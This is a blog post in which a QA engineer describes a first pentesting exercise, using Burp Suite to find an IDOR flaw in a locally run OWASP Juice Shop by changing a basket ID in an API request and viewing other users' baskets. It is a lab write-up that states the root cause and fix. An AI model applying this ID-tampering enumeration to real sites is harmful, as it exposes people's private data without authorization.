+++
date = '2026-03-08T20:18:51-04:00'
draft = false
title = 'QA first steps into webpentest (OWASP Top 10 - A01 Access Control)'
+++

After almost 10 years working a QA Engineer, testing web and mobile apps I decided to explore cybersecurity. Welcome to my first write up here a document how I found my first Access Control vulnerability using OWASP Juice Shop and Burp Suite.

## Juicebox Setup

First thing I did was looking into web pentest (it seems to be the most accessible at least with my knowledge of Web and API testing) and got to know about the OWASP Top 10 a community-driven list of the most critical web application security risks, intended to raise awareness among developers and security professionals.

From there I got curious and wanted to play with these vulnerabilities just that ...well, I didn't have a website to do so, and I really shouldn't just try attacks on a random website. So I learn about VMs and how I could install Kali Linux which comes with a ton of cybersecurity tools free at my disposal. I downloaded Oracle's Virtual Box, then the Kali Linux ISO and proceeded to install the OS. Once I was up and running I discover that OWASP had this "training website" called *Juicebox* which had a bunch of challenges for web pentesting that I could not only access through the web but also run it locally via Docker container with just one command.


```
Pull OWASP JuiceBox Shop 
docker pull bkimminich/juice-shop
```

```
Run OWASP JuiceBox Shop Container
docker run -p 3000:3000 bkimminich/juice-shop
```
### Burpsuite

With Juicebox up and running I decided to see what the website was about. Thinking as a QA I started to do some exploratory testing, how the website works, what might look out of place, what were my limitations as a user, etc. But this wasn't a website for me break as a regular user, this is a website for me to act and think as a hacker. This is when I learn about burpsuite, and Kali linux already had it ready for me to use, but my browser wasn't setup for that. I then set the Firefox proxy so when I toggle it Brupsuite could intersect the requests and responses from the website. I found it overwhelming at first (like any other new thing we learn) but thankfully since I dealt with API testing before I was able to find some familiarity with request statuses and tempering with them.
### First vulnerability 

The first week I focused on the Access control vulnerabilities, being in the number 1 spot of the OWASP Top 10 I figure I could, relatively easy, be able to get access to user data I wasn't suppose to.

I dig for a couple of days (In between day job and daily life) until I notice I could temper with the userId of one of the endpoints I capture from the "basket" (that would be like the Amazon cart here).

```
GET /rest/basket/6 HTTP/1.1
Host: localhost:3000
User-Agent: N/A
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
```

I first capture it and send it to the "repeater" (a designated tab in the Burpsuite tool to iterate in a single request). Then I simple changes the userId from the endpoint from '6' to '1' and for the first time in 2 days I actually got a 200 OK status, not only that I got a response with data from another user.

```
{
   "status":"success",
   "data":{
      "id":1,
      "coupon":null,
      "UserId":1,
      "createdAt":"2026-02-24T01:56:12.744Z",
      "updatedAt":"2026-02-24T01:56:12.744Z",
      "Products":[
         {
            "id":1,
            "name":"Apple Juice (1000ml)",
            "description":"The all-time classic.",
            "price":1.99,
            "deluxePrice":0.99,
            "image":"apple_juice.jpg",
            "createdAt":"2026-02-24T01:56:12.343Z",
            "updatedAt":"2026-02-24T01:56:12.343Z",
            "deletedAt":null,
            "BasketItem":{
               "ProductId":1,
               "BasketId":1,
               "id":1,
               "quantity":2,
               "createdAt":"2026-02-24T01:56:12.869Z",
               "updatedAt":"2026-02-24T01:56:12.869Z"
            }
         },
         {
            "id":2,
            "name":"Orange Juice (1000ml)",
            "description":"Made from oranges hand-picked by Uncle Dittmeyer.",
            "price":2.99,
            "deluxePrice":2.49,
            "image":"orange_juice.jpg",
            "createdAt":"2026-02-24T01:56:12.343Z",
            "updatedAt":"2026-02-24T01:56:12.343Z",
            "deletedAt":null,
            "BasketItem":{
               "ProductId":2,
               "BasketId":1,
               "id":2,
               "quantity":3,
               "createdAt":"2026-02-24T01:56:12.869Z",
               "updatedAt":"2026-02-24T01:56:12.869Z"
            }
         },
         {
            "id":3,
            "name":"Eggfruit Juice (500ml)",
            "description":"Now with even more exotic flavour.",
            "price":8.99,
            "deluxePrice":8.99,
            "image":"eggfruit_juice.jpg",
            "createdAt":"2026-02-24T01:56:12.343Z",
            "updatedAt":"2026-02-24T01:56:12.343Z",
            "deletedAt":null,
            "BasketItem":{
               "ProductId":3,
               "BasketId":1,
               "id":3,
               "quantity":1,
               "createdAt":"2026-02-24T01:56:12.869Z",
               "updatedAt":"2026-02-24T01:56:12.869Z"
            }
         }
      ]
   }
}
```

I could see the baskets of other users with only the change of a single digit. 

### IDOR

Once I capture my first vulnerability I write down how I did it and what were my findings. Just that I wanted to do it properly, how a pentester would do it. So I did a table like the one below:

|Field|Entry|
|---|---|
|OWASP Top 10|A01 - Broken access control|
|Target|OWASP Juice shop|
|Endpoint|/rest/basket/1|
|Original Request|/rest/basket/6|
|Payload|Change ‘6’ to ‘1’|
|Result|Got access to another user’s basket of items|
|Root Cause|No Authorization Check|
|Impact|Unauthorized access to private user data|
|Fix|Validate user ownership / Enforce RBAC (Role base access control)|
|Tool used|Burp suite, Docker|

I also learned that the vulnerability that I found actually had a name inside the Broken Access control category and that is IDOR (Insecure Direct Object Reference) which is defined as a vulnerability that displays content to unauthorized users through URLs and/or form tempering, which fits the description of what I did.

Once I found it I started tempering with the ids to see how many user's basket I could see. I reach the limit of 6 total.

Not only that but I also created a simple CLI tool to automate the attack. Here the github:
https://github.com/mmarinez/juicebox-idor
